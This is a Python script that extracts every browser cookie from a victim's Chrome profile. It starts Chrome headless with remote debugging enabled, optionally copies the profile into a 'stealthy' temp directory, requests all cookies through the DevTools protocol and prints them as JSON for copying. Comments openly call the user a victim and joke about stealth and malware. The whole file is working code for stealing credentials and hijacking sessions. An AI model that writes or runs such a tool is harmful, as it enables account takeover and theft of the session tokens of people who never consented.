import os
import shlex
import shutil
import signal
import sys
import time

import json
import subprocess

import requests
import websocket

def escape(s):
    return s.replace(" ", "\ ")

# Edit this if you want to use a profile other than the default Chrome profile. Usually the profiles are called "Profile 1" etc. To list Chrome profiles, look in the Chrome User Data Directory for your OS.
# If you don't know what this is, don't change it.
PROFILE_NAME = "Default"

# Which localhost port should Chrome's remote debugging protocol listen on temporarily?
REMOTE_DEBUGGING_PORT = 9222

# The words of the Ancient Language (Chrome DevTools Protocol) that summon the cookies if you dare utter them.
GET_ALL_COOKIES_REQUEST = json.dumps({"id": 1, "method": "Network.getAllCookies"})

# Os-specific Chrome flags
os_flags = []

# Edit these if your victim has a wacky Chrome install.
if sys.platform.startswith("linux"):
    CHROME_CMD = "google-chrome"

    LINUX_CHROME_CMDS = ["/usr/bin/google-chrome-stable", "/usr/bin/google-chrome-beta", "/usr/bin/google-chrome"]
    for cmd in LINUX_CHROME_CMDS:
        if os.path.isfile(cmd):
            CHROME_CMD = cmd
            break

    USER_DATA_DIR = os.path.expanduser("~/.config/google-chrome/")

elif sys.platform.startswith("darwin"):
    CHROME_CMD = "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"

    USER_DATA_DIR = os.path.expanduser("~/Library/Application Support/Google/Chrome")

    # macOS can't write crashdumps due to SIP sometimes, work around that by using a writeable dir.
    # https://stackoverflow.com/questions/49103799/running-chrome-in-headless-mode
    os_flags.append("--crash-dumps-dir=/tmp")

elif sys.platform.startswith("win"):
    CHROME_CMD = "chrome.exe"
    USER_DATA_DIR = r"%LOCALAPPDATA%\Google\Chrome\User Data"

else:
    raise RuntimeError("um excuse me kind of OS is this? for real tho what is \"%s\"? y'know what i don't have to deal with this i'm outta here *car ignition noises* *driving noises* *driving noises fade away*" % sys.platform)

fake_user_data_dir = None
if PROFILE_NAME != "Default":
    # Sigh. Here we go.
    # Move the relevant user data dir to somewhere and point Chrome there,
    # since Chrome will always select the "Default" profile in a given directory,
    # and all Chrome profiles are in the same User Data Directory by default.

    # it's a unix system. i know this.
    if sys.platform.startswith("linux") or sys.platform.startswith("darwin"):

        # Replace "/tmp" with your own stealthy-but-writeable directory here.
        # Or don't, I'm a comment not a cop.
        tmpdir = "/tmp"
        copy = ["cp", "-r"]

    elif sys.platform.startswith("win"):
        tmpdir = "%TEMP%"
        copy = ["xcopy", "/e", "/i", "/h"]
    else:
        raise RuntimeError("sweet merciful william gates, please no more of this '%s' OS. okay? i'm very disappointed." % sys.platform)

    profile_dir = os.path.join(USER_DATA_DIR, PROFILE_NAME)

    fake_user_data_dir = os.path.join(tmpdir, "chrome")

    if not os.path.exists(fake_user_data_dir):
        os.mkdir(fake_user_data_dir)

    dest_dir = os.path.join(fake_user_data_dir, "Default")

    # Do CRAZY escaping because cp needs shell=True to read environment variables,
    # which means we have to provide the exact command line.
    if sys.platform.startswith("win"):
        clean_profile_dir = '"%s"' % profile_dir
        dest_dir = '"%s"' % dest_dir
    else:
        clean_profile_dir = escape(profile_dir)

    cmd = " ".join(
            copy + [
                clean_profile_dir,
                dest_dir
                ]
            )

    subprocess.Popen(cmd, shell=True)

    USER_DATA_DIR = fake_user_data_dir

chrome_args = [
        "https://gmail.com", # Or any other URL
        "--headless",
        """--user-data-dir="{user_data_dir}" """.format(user_data_dir=USER_DATA_DIR),
        "--remote-debugging-port={remote_debugging_port}".format(remote_debugging_port=REMOTE_DEBUGGING_PORT),
        ]

CHROME_DEBUGGING_CMD = [escape(CHROME_CMD)] + chrome_args + os_flags
CHROME_DEBUGGING_CMD = " ".join(CHROME_DEBUGGING_CMD)


def summon_forbidden_protocol():
    """IT COMES"""

    # Supress stdout and stderr from the Chrome process so it doesn't
    # pollute our cookie output, for your copy/pasting convenience.
    process = subprocess.Popen(CHROME_DEBUGGING_CMD,
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL)

    # Hey some people have slow computers, quite possibly because of
    # all the malware you're running on them.
    time.sleep(3)
    return process

def hit_that_secret_json_path_like_its_1997():
    response = requests.get("http://localhost:{port}/json".format(port=REMOTE_DEBUGGING_PORT))
    websocket_url = response.json()[0].get("webSocketDebuggerUrl")
    return websocket_url

def gimme_those_cookies(ws_url):
    ws = websocket.create_connection(ws_url)
    ws.send(GET_ALL_COOKIES_REQUEST)
    result = ws.recv()
    ws.close()

    # Parse out the actual cookie object from the debugging protocol object.
    response = json.loads(result)
    cookies = response["result"]["cookies"]

    return cookies

def cleanup(chrome_process):

    pid = chrome_process.pid
    # Try and kill the first chrome process with a PID higher than ours.
    if sys.platform.startswith("linux"):
        for p in map(int, sorted(subprocess.check_output(["pidof", CHROME_CMD]).split())):
            if p > chrome_process.pid:
                pid = p
                break
            else:
                pid = chrome_process.pid + 1

    os.kill(pid, signal.SIGKILL)

    # If we copied a Profile's User Data Directory somewhere, clean it up.
    if fake_user_data_dir is not None:
        shutil.rmtree(fake_user_data_dir)

if __name__ == "__main__":
    forbidden_process = summon_forbidden_protocol()
    secret_websocket_debugging_url = hit_that_secret_json_path_like_its_1997()
    cookies = gimme_those_cookies(secret_websocket_debugging_url)

    # Sleep for a sec so we don't get "Killed" in output.
    time.sleep(1)

    cleanup(forbidden_process)

    print(json.dumps(cookies,indent=4, separators=(',', ': '), sort_keys=True))
